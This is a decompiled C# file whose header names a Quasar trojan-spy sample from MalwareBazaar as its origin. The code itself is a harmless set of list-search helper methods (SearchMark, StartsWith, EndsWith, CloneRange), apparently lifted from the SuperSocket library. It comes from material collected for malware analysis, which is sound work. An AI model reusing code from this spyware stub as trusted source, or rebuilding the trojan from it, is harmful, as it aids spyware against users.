// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.StateFullSearch
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public static class StateFullSearch
  {
    public static int IndexOf<T>(this IList<T> source, T target, int pos, int length) where T : IEquatable<T>
    {
      for (int index = pos; index < pos + length; ++index)
      {
        if (source[index].Equals(target))
          return index;
      }
      return -1;
    }

    public static int? SearchMark<T>(this IList<T> source, T[] mark, out int parsedLength) where T : IEquatable<T> => source.SearchMark<T>(0, source.Count, mark, 0, out parsedLength);

    public static int? SearchMark<T>(this IList<T> source, T[] mark) where T : IEquatable<T> => source.SearchMark<T>(0, source.Count, mark, 0, out int _);

    public static int? SearchMark<T>(this IList<T> source, int offset, int length, T[] mark) where T : IEquatable<T> => source.SearchMark<T>(offset, length, mark, 0, out int _);

    public static int? SearchMark<T>(
      this IList<T> source,
      int offset,
      int length,
      T[] mark,
      out int parsedLength)
      where T : IEquatable<T>
    {
      return source.SearchMark<T>(offset, length, mark, 0, out parsedLength);
    }

    public static int? SearchMark<T>(
      this IList<T> source,
      int offset,
      int length,
      T[] mark,
      int matched)
      where T : IEquatable<T>
    {
      return source.SearchMark<T>(offset, length, mark, matched, out int _);
    }

    public static int? SearchMark<T>(
      this IList<T> source,
      int offset,
      int length,
      T[] mark,
      int matched,
      out int parsedLength)
      where T : IEquatable<T>
    {
      int pos = offset;
      int num1 = offset + length - 1;
      int index1 = matched;
      parsedLength = 0;
      if (matched > 0)
      {
        for (int index2 = index1; index2 < mark.Length && source[pos++].Equals(mark[index2]); ++index2)
        {
          ++index1;
          if (pos > num1)
          {
            if (index1 != mark.Length)
              return new int?(-index1);
            parsedLength = mark.Length - matched;
            return new int?(offset);
          }
        }
        if (index1 == mark.Length)
        {
          parsedLength = mark.Length - matched;
          return new int?(offset);
        }
        pos = offset;
        index1 = 0;
      }
      int num2;
      while (true)
      {
        num2 = source.IndexOf<T>(mark[index1], pos, length - pos + offset);
        if (num2 >= 0)
        {
          int num3 = index1 + 1;
          for (int index3 = num3; index3 < mark.Length; ++index3)
          {
            int index4 = num2 + index3;
            if (index4 > num1)
              return new int?(-num3);
            if (source[index4].Equals(mark[index3]))
              ++num3;
            else
              break;
          }
          if (num3 != mark.Length)
          {
            pos = num2 + 1;
            index1 = 0;
          }
          else
            goto label_20;
        }
        else
          break;
      }
      return new int?();
label_20:
      parsedLength = num2 - offset + mark.Length;
      return new int?(num2);
    }

    public static int SearchMark<T>(
      this IList<T> source,
      int offset,
      int length,
      SearchMarkState<T> searchState,
      out int parsedLength)
      where T : IEquatable<T>
    {
      int? nullable = source.SearchMark<T>(offset, length, searchState.Mark, searchState.Matched, out parsedLength);
      if (!nullable.HasValue)
      {
        searchState.Matched = 0;
        return -1;
      }
      if (nullable.Value < 0)
      {
        searchState.Matched = -nullable.Value;
        return -1;
      }
      searchState.Matched = 0;
      return nullable.Value;
    }

    public static int StartsWith<T>(this IList<T> source, T[] mark) where T : IEquatable<T> => source.StartsWith<T>(0, source.Count, mark);

    public static int StartsWith<T>(this IList<T> source, int offset, int length, T[] mark) where T : IEquatable<T>
    {
      int num1 = offset;
      int num2 = offset + length - 1;
      for (int index1 = 0; index1 < mark.Length; ++index1)
      {
        int index2 = num1 + index1;
        if (index2 > num2)
          return index1;
        if (!source[index2].Equals(mark[index1]))
          return -1;
      }
      return mark.Length;
    }

    public static bool EndsWith<T>(this IList<T> source, T[] mark) where T : IEquatable<T> => source.EndsWith<T>(0, source.Count, mark);

    public static bool EndsWith<T>(this IList<T> source, int offset, int length, T[] mark) where T : IEquatable<T>
    {
      if (mark.Length > length)
        return false;
      for (int index = 0; index < Math.Min(length, mark.Length); ++index)
      {
        if (!mark[index].Equals(source[offset + length - mark.Length + index]))
          return false;
      }
      return true;
    }

    public static T[] CloneRange<T>(this IList<T> source, int offset, int length)
    {
      if (source is T[] sourceArray)
      {
        T[] destinationArray = new T[length];
        Array.Copy((Array) sourceArray, offset, (Array) destinationArray, 0, length);
        return destinationArray;
      }
      T[] objArray = new T[length];
      for (int index = 0; index < length; ++index)
        objArray[index] = source[offset + index];
      return objArray;
    }
  }
}
